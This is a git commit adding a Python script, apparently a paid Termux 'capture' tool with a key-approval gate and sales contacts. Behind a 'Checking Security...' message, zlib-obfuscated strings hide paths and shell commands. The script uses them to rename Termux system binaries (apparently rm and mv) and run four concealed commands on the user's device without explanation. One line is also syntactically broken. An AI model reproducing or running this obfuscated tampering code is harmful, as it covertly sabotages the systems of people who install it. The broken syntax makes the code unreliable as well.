0e910cbf71b35207e32255a008e208f1ad6bfbd3
reyadz <130862470+reyadz@users.noreply.github.com>
2023-08-06 19:31:58 +0600

    Add files via upload

---
+++ osm.py
@@ -0,0 +1,122 @@
+from os import path
+import os,base64,zlib,pip,urllib,time,sys
+import os
+import time
+import requests
+
+import subprocess
+import os
+
+try:
+	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
+	from string import *
+	from concurrent.futures import ThreadPoolExecutor as ThreadPool
+except(ImportError):
+    os.system("pip install requests")
+    pass
+import os,sys
+os.system("clear")
+print(" Checking Security...")
+import os,shutil,zlib,time
+sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
+sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')
+sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')
+sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')
+sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')
+sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')
+sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')
+sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')
+#--checking if file is not avalible
+if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
+        pass
+        exit("Error in termux modules ")
+if os.path.exists(sz):
+        os.rename(sz1,'.f1')
+        os.rename(sz2,'.f2')
+        os.system(sz3)
+        os.system(sz4)
+        os.system(sz5)
+        os.system(sz6)
+else:
+        pass
+if not str(len(open('termux-setup-storage')
+	time.sleep(0);print('YOU CANT RUN THIS TOOL WITHOUT STORAGE PERMISSION');exit()
+#------------------[ MACHINE-SUPPORT ]---------------#
+
+def animation(u):
+	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
+def alvino_xy(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+def banner():
+	print("""
+\033[1;32m╔══════════╦═════════════════════════════════╗\033[1;32m
+║\033[1;36m╦═╗═╗ ╦╔═╗\033[1;32m║\033[1;36mOWNER: REYAD AND SHIPU \033[1;32m          ║\033[1;32m
+║\033[1;36m╠╦╝╔╩╦╝╚═╗\033[1;32m║\033[1;36mFACEBOOK: MD REYAD HOSSAIN SHANTO\033[1;32m║\033[1;32m
+║\033[1;36m╩╚═╩ ╚═╚═╝\033[1;32m║\033[1;36mWHATSAPP: +8801989861704\033[1;32m         ║\033[1;32m
+╠══════════╩════╦═════════════╦══════════════╣
+║\033[1;36mGITHUB:BINOD-XD\033[1;32m║\033[1;36mVERSION:1.0.1\033[1;32m║\033[1;36mRANDOM X FILE\033[1;32m ║\033[1;32m
+╚═══════════════╩═════════════╩══════════════╝
+\033[1;91m\033[1;46m\033[1;97m                RXS PAID TOOLS                \033[;0m\033[1;91m\033[1;92m""")
+
+def approval():
+  time.sleep(1)
+  uuid = str(os.geteuid())+"RS"
+  id = "TEAMRXS"+"".join(uuid)
+  os.system('clear')
+  banner()
+  animation("\033[1;37m [\u001b[36m𝜩\033[1;37m] YOU NEED APPROVAL TO USE THIS TOOL   \033[1;37m")
+  print("\033[1;37m [\u001b[36m𝜩\033[1;37m] YOUR KEY :\u001b[36m "+id);time.sleep(0.1)
+  print ("""\x1b[92m══════════════════════════════════════════════\x1b[97m""")
+  try:
+    httpCaht = requests.get("https://github.com/reyadz/PAID-RXS/blob/main/capstur.txt").text
+    if id in httpCaht:
+      animation("\033[1;97m [\u001b[36m❯\033[1;37m] YOUR KEY HAS BEEN APPROVED !!!")
+      print(f"\x1b[92m══════════════════════════════════════════════\x1b[97m")
+      msg = str(os.geteuid())
+      time.sleep(1)
+      pass
+    else: 
+      animation("\x1b[1;97m [\u001b[36m❯\033[1;37m] SORRY YOUR KEY HAS NOT BEEN APPROVED ");
+      print(f"\x1b[92m══════════════════════════════════════════════\x1b[97m")
+      time.sleep(0.1)
+      animation("\033[1;37m [\u001b[36m1\033[1;37m] CONTACT ADMIN REYAD   \033[1;37m")
+      animation("\033[1;37m [\u001b[36m2\033[1;37m] CONTACT ADMIN TAHOSIN   \033[1;37m")
+      ok = input(' [\u001b[36m❯\033[1;37m] CHOOSE ADMIN TO CONTACT ')
+      if ok =='2':
+      	os.system('xdg-open https://wa.me/+8801989861704?text=Assalamuwalaikum%20Sir,%20I%20Want%20To%20Buy%20Your%20RXS%20Paid%20Tool.%20My%20Key:%20'+id)
+      if ok =='1':
+      	os.system('xdg-open https://www.facebook.com/reyadbross')
+      time.sleep(1)
+      approval()
+  except: 
+     exit() 
+approval()
+
+time.sleep(1.5)
+print('[\033[1;36m√\033[1;37m] Updating Tool ! ')
+time.sleep(1.5)
+os.system("clear")
+print('[\033[1;36m√\033[1;37m] Tool Update Done')
+time.sleep(1.5)
+print('[\033[1;36m√\033[1;37m] Now You Can Enjoy Tool (^,^) ')
+time.sleep(1.5)
+os.system("clear")
+print("""
+\033[1;36m███    ██ ███████ ██   ██  █████  ██      
+\033[1;36m████   ██ ██      ██   ██ ██   ██ ██      
+\033[1;36m██ ██  ██ █████   ███████ ███████ ██      
+\033[1;36m██  ██ ██ ██      ██   ██ ██   ██ ██      
+\033[1;36m██   ████ ███████ ██   ██ ██   ██ ███████ 
+\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m
+\033[1;36m[😈] DEVELOPER : NEHAL KHAN   
+\033[1;36m[😈️] GITHUB    : Nehal901   
+\033[1;36m[😈] TOOL NAME : METHOD CAPTURE
+\033[1;36m[😈] TOOL TYPE : PAID 
+\033[1;36m[😈] VERSION   : 0.1
+\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m""")
+print("\033[1;36mYOUR KEY : A4HT8GSTR85B5ETY5D")
+print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
+print("[+] CONTACT ADMIN TO GET APPROVAL")
+input('[+] PRESS ENTER TO BUY APPROVAL')
+os.system("xdg-open https://wa.me/+8801775174361")
+print("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
